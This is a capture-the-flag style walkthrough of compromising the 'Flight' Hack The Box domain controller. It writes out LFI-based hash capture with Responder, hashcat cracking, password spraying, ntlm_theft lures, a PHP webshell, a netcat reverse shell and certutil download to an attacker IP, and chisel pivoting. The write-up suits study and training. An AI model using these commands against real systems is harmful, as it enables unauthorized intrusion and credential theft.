## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file

## Walkthrough

1. Run nmap scan

<img width="895" height="655" alt="image" src="https://github.com/user-attachments/assets/ff5fb38f-4816-4900-8436-133c77fcf00a" />

2. The nmap scan reveals a bunch of open ports, including DNS (53), LDAP (389,3268) and Kerberos (88) meaning that this is a Domain Controller. We also see an open web server on port 80 that looks interesting. We add the domain to our `/etc/hosts` file and check out the website, which seems to just be static.

<img width="1008" height="842" alt="image" src="https://github.com/user-attachments/assets/b06483e9-7a32-4ccc-af01-d0e54784401d" />

3. As with all websites, we do subdomain enumeration to try to increase our attack surface using `ffuf`

`ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7069`

<img width="821" height="457" alt="image" src="https://github.com/user-attachments/assets/210a9653-0474-46d5-b605-b901038ccd52" />

4. Subdomain enumeration reveals the school subdomain, so add this to our hosts file and explore the website. 

<img width="1541" height="979" alt="image" src="https://github.com/user-attachments/assets/0e9f5155-daf7-477c-8d1b-7ec4a8607ef9" />

5. It is a PHP website that passes the HTML file in the view parameter. We test for LFI and it appears the view parameter may be vulnerable to file inclusion

<img width="590" height="372" alt="image" src="https://github.com/user-attachments/assets/ccedb4e5-8fa9-4eea-bc8c-ff6e00a970cd" />

6. Confirmed file inclusion on view parameter by reading the error logs on `C:\xampp\apache\logs\error.log`

<img width="2257" height="1086" alt="image" src="https://github.com/user-attachments/assets/542b4363-0ed8-41b6-8f9f-5e1b88685309" />

7. Now, we run Responder on our local machine and attempt to connect to it using the file inclusion vulnerability. And we got a user hash!

`sudo Responder -I tun0 -dw`

<img width="829" height="412" alt="image" src="https://github.com/user-attachments/assets/88aa1dec-18c4-4d2c-81ea-6ae3f817371b" />

8. We attempt to crack the NTLMv2 hash offline using hashcat and we get svc_apache's plaintext password!

`hashcat -m 5600 svc_apache.hash /usr/share/wordlists/rockyou.txt`

<img width="823" height="448" alt="image" src="https://github.com/user-attachments/assets/31d1e11e-938d-4aa7-85ef-8942f0196647" />

9. Check credentials work with netexec and enumerate users with SMB login

`nxc smb flight.htb -u svc_apache -p $(cat ../user/svc_apache.pass) --users`

<img width="834" height="604" alt="image" src="https://github.com/user-attachments/assets/c6b2e79f-0067-4944-8c69-fd257fd892e6" />

10. With the users list, we do a password spraying attack with svc_apache's password to see if there's any password reuse on the domain. And we find the user S.Moon has the same password!

`nxc smb flight.htb -u usernames.list -p $(cat ../user/svc_apache.pass) --continue-on-success`

<img width="899" height="317" alt="image" src="https://github.com/user-attachments/assets/10f40940-27d3-4319-b605-f16189875589" />

11. User S.Moon has READ and WRITE permissions on Shared SMB share. Upload malicious files to steal user hashes using ntlm_theft.py

`nxc smb flight.htb -u S.Moon -p $(cat ../user/svc_apache.pass) --shares`

`python3 ~/tools/ntlm_theft/ntlm_theft.py -g all -s 10.10.14.226 -f theft`

<img width="894" height="251" alt="image" src="https://github.com/user-attachments/assets/ec6eb759-713d-4270-b007-b85b80456e8b" />

12. Log into Shared SMB share using smbclient and upload ntlm_theft.py files

`smbclient //flight.htb/Shared -U S.Moon`

<img width="755" height="463" alt="image" src="https://github.com/user-attachments/assets/a295ce20-60ba-4d1e-ba88-4aa7c657fec6" />

13. On Responder, we get c.bum's hash after upload! 

<img width="908" height="159" alt="image" src="https://github.com/user-attachments/assets/dc0ae8d6-c79a-4396-8b7c-2513feda9a9a" />

14. We will crack this hash offline and then check c.bum's permissions on SMB with Netexec

`hashcat -m 5600 c.bum.hash /usr/share/wordlists/rockyou.txt`

`nxc smb flight.htb -u c.bum -p $(cat c.bum.pass) --shares`

<img width="912" height="136" alt="image" src="https://github.com/user-attachments/assets/1fa4fc69-ebd8-45ad-908e-4009f2940692" />


15. We have write permissions on the Web share. We will put a test file into the school.flight.htb directory to see if we can access files in that folder from the file inclusion vulnerable view parameter

<img width="1433" height="311" alt="image" src="https://github.com/user-attachments/assets/a55bf107-fc72-4113-b7a0-d2ed9a189154" />

16. Yes, we can! We will now upload a PHP webshell to get code execution on the server. Success!

`<?php system($_REQUEST['cmd']); ?>`

<img width="531" height="120" alt="image" src="https://github.com/user-attachments/assets/fc1e80d3-aef7-42ed-8256-d3914b785b99" />

17. Now, we will upgrade to a proper reverse shell by uploading netcat and using that to connect to our attacker host

`http://school.flight.htb/webshell.php?cmd=nc.exe%20-e%20cmd.exe%20%2010.10.14.226%204444`

<img width="521" height="128" alt="image" src="https://github.com/user-attachments/assets/c4862cde-ab09-422c-aa92-318fe4344593" />

18. Now, we have a foothold on the machine! We will transfer over the RunasCs.exe file to the victim host so that we can run commands as C.Bum. 

`certutil -urlcache -f http://10.10.14.226:8000/RunasCs.exe runas.exe`

19. Then, run the script to get a remote shell as C.Bum and grab the user flag!

`runas.exe c.bum [PASS] -r 10.10.14.226:1234 cmd`

<img width="523" height="446" alt="image" src="https://github.com/user-attachments/assets/c4ef4a15-cb0f-4beb-9ed0-3cb30128fe04" />

20. Do some basic enumeration reveals an internal port that was not accessible from outside, TCP port 8000. We will transfer over chisel using certutil to pivot into the internal network and see whats inside

<img width="634" height="856" alt="image" src="https://github.com/user-attachments/assets/a6985174-3dda-457e-a24a-90afe2453838" />

21. Start chisel server on local attacker machine and set up chisel client on the victim machine

On local:
`chisel server --socks5 --reverse`

On victim:
`chisel.exe client --fingerprint iZ3iUKs5hO1F7FamcuKBpmgQ0iZZDOTBhfmH2jVkjJQ= 10.10.14.226:8080 R:8001:127.0.0.1:8000`

<img width="1959" height="1057" alt="image" src="https://github.com/user-attachments/assets/6a98f2fe-4c72-4fc3-a345-77cc1ee2b459" />

22. We found another website and if we look at the inetpub folder on the victim host, we find a development folder that corresponds to the internal website. Since we know we have access to the web root, we upload an aspx webshell using certutil and we got a shell!

<img width="1529" height="695" alt="image" src="https://github.com/user-attachments/assets/6c65ca8f-8995-4276-a8b8-9b8d3c3f86f5" />
